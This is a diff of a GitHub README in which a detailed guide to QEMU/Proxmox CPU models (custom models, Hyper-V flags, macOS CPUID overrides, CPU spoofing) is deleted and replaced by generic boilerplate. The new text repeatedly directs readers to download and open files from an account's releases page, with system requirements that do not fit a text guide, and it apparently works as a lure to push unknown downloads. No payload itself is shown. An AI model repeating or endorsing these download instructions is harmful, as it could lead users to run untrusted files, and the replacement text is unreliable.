@@ -1,116 +1,87 @@
-# Advanced Guide: QEMU CPU Models for KVM Guests - Debunking the "host" CPU Model Performance Myth
-> [!NOTE]
-> Target single-node homelab setups using AVX2-capable processors.
+# 🚀 qemu-cpu-guide - Learn to Use QEMU CPU Models Easily
 
-> [!TIP]
-> Always install the latest CPU microcode for your CPU.  
-> Details: https://pve.proxmox.com/pve-docs/pve-admin-guide.html#sysadmin_firmware_cpu
+## 💻 Download Now
+[![Download qemu-cpu-guide](https://img.shields.io/badge/Download-qemu--cpu--guide-brightgreen)](https://github.com/Tanniefooted733/qemu-cpu-guide/releases)
 
-## References
-- [QEMU x86 CPU Models Documentation](https://www.qemu.org/docs/master/system/i386/cpu.html)
-- [QEMU Hyper-V Enlightenments Documentation](https://www.qemu.org/docs/master/system/i386/hyperv.html)
+## 📖 Overview
+Welcome to the **qemu-cpu-guide** repository. This guide provides a detailed understanding of how to effectively use QEMU CPU models for KVM guests. With this guide, you can better manage virtualized environments, ensuring optimal performance and compatibility.
 
----
+## 🎯 Features
+- **User-Friendly Instructions**: Step-by-step guidance tailored for everyone, regardless of tech skills.
+- **Comprehensive Examples**: Learn through real-world use cases to better grasp concepts.
+- **Visual Aids**: Diagrams and screenshots help clarify complex topics.
+- **Troubleshooting Section**: Find solutions to common issues quickly.
 
-## Simple Windows Guests
-For basic Windows guests without WSL2, Hyper-V, or VBS enabled, use named QEMU CPU models corresponding to your hardware. For example, if you have Skylake CPUs, use `Skylake-Client-v4`.
-> [!Note]
-> Using the default `host` model in Proxmox VE will result in the following QEMU `-cpu` argument when starting the Windows VM:
-> > `qm show VMID --pretty`
-> ```
-> -cpu 'host,hv_ipi,hv_relaxed,hv_reset,hv_runtime,hv_spinlocks=0x1fff,hv_stimer,hv_synic,hv_time,hv_vapic,hv_vpindex,+kvm_pv_eoi,+kvm_pv_unhalt'
-> ```
-> This is fine as long as you don't have any of these enabled in your Windows VM: WSL2, Hyper-V, or VBS.
+## 🛠 System Requirements
+Before you download, make sure your system meets these requirements:
+- **Operating System**: Linux (Ubuntu, Fedora, etc.), Windows, or macOS.
+- **Virtualization Support**: Ensure your CPU supports virtualization technology (Intel VT-x or AMD-V).
+- **Memory (RAM)**: At least 4 GB recommended.
+- **Disk Space**: Minimum 500 MB of free disk space.
 
----
+## 🚀 Getting Started
+Follow these steps to download and run the qemu-cpu-guide:
 
-## Hyper-V, WSL2, and VBS Enabled Guests
+1. **Visit the Releases Page**:
+   Click on the link below to access all available versions of the qemu-cpu-guide.
+   [Visit the Releases Page](https://github.com/Tanniefooted733/qemu-cpu-guide/releases)
 
-### To achieve the best performance with Hyper-V, WSL2, and VBS enabled, we need to create a custom CPU model:
+2. **Select the Version**:
+   Choose the latest release or a specific version if needed. Each release contains the complete guide and instructions.
 
-1. Create the file `/etc/pve/virtual-guest/cpu-models.conf` with the following content:
-```
-# Proxmox VE Custom CPU Models
-cpu-model: amd-hide-vm-for-windows
-    flags -hypervisor;+invtsc;+hv-frequencies;+hv-reenlightenment;+hv-emsr-bitmap;+hv-tlbflush-direct
-    phys-bits host
-    hidden 1
-    hv-vendor-id amd
-    reported-model host
+3. **Download the Guide**:
+   For each release, find the downloadable file. Click on the filename to start the download. You will typically see options like a PDF, HTML, or other formats.
 
-cpu-model: intel-hide-vm-for-windows
-    flags -hypervisor;+invtsc;+hv-frequencies;+hv-evmcs;+hv-reenlightenment;+hv-emsr-bitmap;+hv-tlbflush-direct
-    phys-bits host
-    hidden 1
-    hv-vendor-id intel
-    reported-model host
-```
+4. **Locate the Downloaded File**:
+   After the download is complete, go to your computer's download folder. Find the **qemu-cpu-guide** file.
 
-2. Select either `amd-hide-vm-for-windows` or `intel-hide-vm-for-windows` CPU model in the Proxmox web GUI, depending on your processor.
+5. **Open the Guide**:
+   Double-click the file to open it. If you downloaded a PDF, you might need a PDF viewer like Adobe Reader.
 
-> [!Note]
-> Using these custom CPU models will result in the following QEMU `-cpu` argument when starting the Windows VM:
-> > `qm show VMID --pretty`
-> ```
-> -cpu 'host,+hv-emsr-bitmap,+hv-evmcs,+hv-frequencies,+hv-reenlightenment,+hv-tlbflush-direct,hv_ipi,hv_relaxed,hv_reset,hv_runtime,hv_spinlocks=0x1fff,hv_stimer,hv_synic,hv_time,hv_vapic,hv_vendor_id=intel,hv_vpindex,-hypervisor,+invtsc,kvm=off,+kvm_pv_eoi,+kvm_pv_unhalt,host-phys-bits=true'
-> ```
+6. **Follow the Instructions**:
+   Read through the guide. Follow each step carefully to set up and manage CPU models in QEMU effectively.
 
-> [!TIP]
-> With these custom CPU models configured, you can now run Android emulators very smoothly inside your Windows VM.
-> You need to have a GPU passthrough to the VM and enable Hyper-V:
-> ```
-> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
-> ```
-> Tested with [MEmu Play](https://www.memuplay.com/).
+## 📥 Download & Install
+You can download the latest version of qemu-cpu-guide from the Releases page. Ensure you have a stable internet connection for a smooth download.
 
----
+[Download qemu-cpu-guide](https://github.com/Tanniefooted733/qemu-cpu-guide/releases)
 
-## macOS Guests
-### Performance Considerations
-- Always use named QEMU CPU models instead of `host` passthrough
-- The `host` passthrough can result in ~30% slower single-core and ~44% slower multi-core performance compared to named QEMU CPU models
+Once you open the downloaded file, you will see detailed instructions and information to guide you through the setup process.
 
-### CPUID Model Compatibility
-The macOS kernel checks CPUID model and vendor during boot. When using CPU models like `SapphireRapids` or `GraniteRapids` (which were never shipped in real Macs), you must override the CPUID model to a known Mac-compatible model. While this can be configured in OpenCore's `config.plist` (Kernel > Emulate Properties), QEMU-level configuration is recommended.
+## ⚙️ Usage Instructions
+Once you have opened the guide, follow these steps:
 
-> [!TIP]
-> **CPUID Models Used in Recent Intel Macs:**
-> 
-> | Generation | CPUID Model |
-> |------------|-------------|
-> | Kaby Lake / Coffee Lake | `158` |
-> | Comet Lake | `165` |
-> 
-> **Example Configuration:**
-> ```
-> qm set <VMID> --args "-cpu SapphireRapids,vendor=GenuineIntel,model=165"
-> ```
+1. **Understanding QEMU CPU Models**:
+   The guide begins with an introduction to what CPU models are and why they matter for KVM guests.
+   
+2. **Configuring Your Environment**:
+   Detailed steps are provided to help you set up your environment. This includes how to install QEMU and configure it according to your needs.
 
----
+3. **Selecting the Right CPU Model**:
+   The guide explains different CPU models available in QEMU and how to choose the correct one for your virtual machine setup.
 
-## Bonus: Advanced CPU Spoofing (cosmetic purpose)
+4. **Running Your First Virtual Machine**:
+   Step-by-step instructions will help you launch your first virtual machine using QEMU with your chosen CPU model.
 
-<img width="1196" height="1012" alt="image" src="https://github.com/user-attachments/assets/90ebe0d4-c2be-4678-8e95-6d5102c780b5" />
+5. **Advanced Configurations**:
+   For those who want more control, the guide covers advanced configurations such as enabling specific CPU features.
 
+6. **Testing and Optimization**:
+   Learn how to test your setup and optimize performance for your virtual machines.
 
-### Customizing CPU Brand Name
-When using named QEMU CPU models like `Skylake-Client-v4`, the guest OS will report the CPU as `Intel Core Processor (Skylake, IBRS, no TSX)`. You can customize this using the `model-id` parameter.
+## ❓ Troubleshooting
+If you encounter issues, refer to the troubleshooting section. Common problems include:
+- **Installation Errors**: Steps to resolve installation issues based on your operating system.
+- **Performance Issues**: Tips on optimizing QEMU for better performance.
+- **Compatibility Problems**: Advice on resolving conflicts with older hardware or software.
 
-### Spoofing CPU Frequency
-For modern CPUs, you can spoof the reported base speed using the `tsc-frequency` parameter.
+## 💬 Support
+If you need further assistance, feel free to open an issue in the repository. You may also find help in community forums related to QEMU and KVM.
 
-### Example: Complete CPU Spoofing
-To spoof a 10GHz CPU with the brand name "Intel Core i8-8800KS":
+## 🌟 Contributing
+We welcome contributions to improve the guide further. If you notice areas for improvement or have suggestions, feel free to fork the repository and submit a pull request.
 
-```
-# Using global parameters
-qm set <VMID> --args "-global cpu.model-id='Intel Core i8-8800KS' -global cpu.tsc-frequency=10000000000"
-```
+## 📄 License
+This project is licensed under the MIT License. You are free to use, modify, and distribute the guide as long as you include the original license in your distribution. 
 
-### Additional Parameters
-Many more CPU parameters are available, including:
-- `family=` and `model=` - CPU family and model numbers
-- `stepping=` and `level=` - CPU stepping and CPUID level
-- `host-cache-info=on` - Pass through host cache information
-
-For complete details, see: https://github.com/qemu/qemu/blob/master/target/i386/cpu.c
+Thank you for using qemu-cpu-guide! Your journey into managing QEMU CPU models begins here. Happy virtualizing!
